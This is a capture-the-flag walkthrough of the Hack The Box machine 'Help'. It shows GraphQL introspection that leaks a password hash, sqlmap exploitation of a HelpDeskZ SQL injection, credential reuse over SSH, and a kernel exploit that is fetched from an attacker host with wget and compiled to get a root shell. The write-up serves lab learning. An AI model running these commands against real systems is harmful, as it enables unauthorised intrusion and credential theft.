# Help - Easy

```sh
sudo vim /etc/hosts
# add help.htb

nmap -T4 -p- -A -Pn -v help.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 7.2p2 Ubuntu 4ubuntu2.6
    * 80/tcp - http - Apache httpd 2.4.18
    * 3000/tcp - http - Node.js Express framework

* the webpage on port 80 is the Apache2 Ubuntu default landing page; the source code does not offer any clues

* checking the webpage on port 3000, it gives a message in JSON format - '{"message":"Hi Shiv, To get access please find the credentials with given query"}'

* web enumeration for website on port 80:

    ```sh
    gobuster dir -u http://help.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx,js,json,docx,pdf,cgi,sql,xml,tar,gz,db -t 25
    # dir scan with small wordlist and multiple extensions

    ffuf -c -u "http://help.htb" -H "Host: FUZZ.help.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fw 18 -s
    # subdomain scan
    ```

* the ```gobuster``` scan finds a page '/support' - navigating to this page shows a login page for "HelpDeskZ Support Center"

* the source code or the webpage does not show any version info; we can continue to enumerate the linked pages

* along with the login page, there are links to 'Submit a Ticket', 'Knowledgebase' and 'News' - only 'Submit a Ticket' option seems to be of use as we can create a ticket, the other links have no info

* the login form has fields 'email address' & 'password' - we can try default creds like 'admin@help.htb:admin' and 'admin@help.htb:password' but it does not work

* from the webpage on port 3000, we have a username 'shiv' - if we try creds like 'shiv@help.htb:admin' and 'shiv@help.htb:password', it still fails

* web enumeration for webpage on port 3000:

    ```sh
    gobuster dir -u http://help.htb:3000/ -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md -t 25
    # dir scan with smaller wordlist

    gobuster dir -u http://help.htb:3000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,md -t 25
    # dir scan
    ```

* as the webpage on port 3000 mentions to find creds with given query, and the query contains the keyword 'message', we can try query fuzzing using the parameter 'message' - on both webpages:

    ```sh
    ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://help.htb:3000/?message=FUZZ' -fs 81 -s

    ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u 'http://help.htb:3000/?message=FUZZ' -fs 81 -s

    ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u 'http://help.htb/?message=FUZZ' -fw 3503 -t 25 -s
    # query fuzzing on port 80
    ```

* query fuzzing also does not give anything for both of the webpages

* as the webpage on port 3000 is based on Node.js Express framework, and uses a query according to the message, we can Google for any other information

* Googling for "Express framework query language" and similar terms leads to results for GraphQL - a query language for APIs

* we can try using GraphQL-specific wordlists for the webpage on port 3000 for further enumeration:

    ```sh
    gobuster dir -u http://help.htb:3000/ -w /usr/share/seclists/Discovery/Web-Content/graphql.txt -x txt,php,html,md -t 25
    # this finds multiple endpoints for '/graphql'
    ```

* the GraphQL-specific wordlist works and we get an endpoint '/graphql'

* navigating to 'http://help.htb:3000/graphql', we get the error 'GET query missing'

* Googling for GraphQL enumeration leads to [this hacktricks blog](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html) and [payloads for enumeration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md) - we can use these methods to enumerate the instance further:

    * 'http://help.htb:3000/graphql?query=query{__typename}' - the response to the universal query confirms this URL hosts a GraphQL endpoint

    * 'http://help.htb:3000/graphql?query=query{__schema{types{name,fields{name}}}}' - this queries the schema info

    * the schema info provides a lot of data; in this, the type "user" includes the fields "username" & "password" - we can include this in our next query

    * 'http://help.htb:3000/graphql?query=query{user{username,password}}' - this discloses the creds 'helpme@helpme.com:5d3c93182bb20f07b994a7f617e99cff'

* we can now try to use these creds in the HelpDeskZ login page but it does not work

* checking the password, it looks like a MD5 hash - and hash identifier tools confirm it is a MD5 hash

* using [Crackstation](https://crackstation.net/) to check if this hash can be cracked gives us the cleartext 'godhelpmeplz'

* if we try logging in with the creds 'helpme@helpme.com:godhelpmeplz', it works and we are able to access the ticket page

* there are no tickets created and the rest of the pages do not contain any info

* Googling for "helpdeskz enumeration" leads to [this old repo for helpdeskz](https://github.com/ViktorNova/HelpDeskZ) - this includes a file 'UPGRADING.txt' that contains the version info

* if we check for the same page in our case by navigating to 'http://help.htb/support/UPGRADING.txt', it works, and we can confirm that this instance is using HelpDeskZ 1.0.2

* Googling for exploits associated with this version using ```searchsploit helpdeskz``` gives us 2 exploits - an arbitrary file upload and an authenticated SQLi

* we can check the [authenticated SQLi exploit](https://www.exploit-db.com/exploits/41200):

    * first, create a ticket by submitting the data, and including an attachment (like an image file) to populate the DB

    * the exploit script does not work properly so we can replicate the exploit using ```sqlmap```

    * navigate to the test ticket created, and intercept the request to download the test attachment - and 'copy to file' in Burp Suite to save this request

    * we can use this request file with ```sqlmap``` - we need to mention the vulnerable parameter 'param[]' to speed up the process:

        ```sh
        sqlmap -r help.req -p 'param[]' --level 5 --risk 3 --batch --dump
        ```
    
    * ```sqlmap``` dumps the DB and this gives us the creds 'support@mysite.com:Welcome1' for the Administrator user

* while we are unable to login using the given creds into the HelpDeskZ login page, we can use this password for SSH login

* for SSH login, we can use various usernames similar to, and including the ones we have discovered - 'support', 'shiv', 'helpme', 'admin', 'help', 'helpdesk', 'helpdeskz'

* the username 'help' works in this case for SSH login:

    ```sh
    ssh help@help.htb
    # the SSH banner mentions 'You have new mail'

    ls -la

    cat user.txt
    # user flag

    id

    sudo -l
    # does not work

    ls -la /var/mail
    # we have mail for 'help' user

    cat /var/mail/help
    ```

* the mail file contains a lot of auto-generated mails via cronjobs, and includes several commands ran by the root user - the email contents show some of the commands executed by the root user:

    * ```/usr/bin/npm install -g forever```
    * ```/usr/local/bin/forever start /home/help/help/dist/bundle.js```

* we can check the files related to ```forever``` for more info:

    ```sh
    ls -la
    # we have directories 'help' and '.forever'

    ls -la help
    # install files for 'forever'

    ls -la .forever
    # check the log files
    ```

* this does not give any useful info; we can use ```linpeas``` for enumeration - fetch the script from attacker:

    ```sh
    wget http://10.10.14.95:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 4.4.0-116-generic, Ubuntu 16.04.5
    * sudo version 1.8.16

* as it is an older machine, we can Google for exploits related to the kernel version - this gives us results for [CVE-2017-16995 - a local privesc vulnerability for the exact version](https://www.exploit-db.com/exploits/44298)

* we can attempt this kernel privesc exploit:

    ```sh
    wget http://10.10.14.95:8000/44298.c
    # fetch exploit code from attacker

    gcc 44298.c -o exploit
    # compile the code

    ./exploit
    # this works and we get root shell

    id
    # root

    cat /root/root.txt
    # root flag
    ```
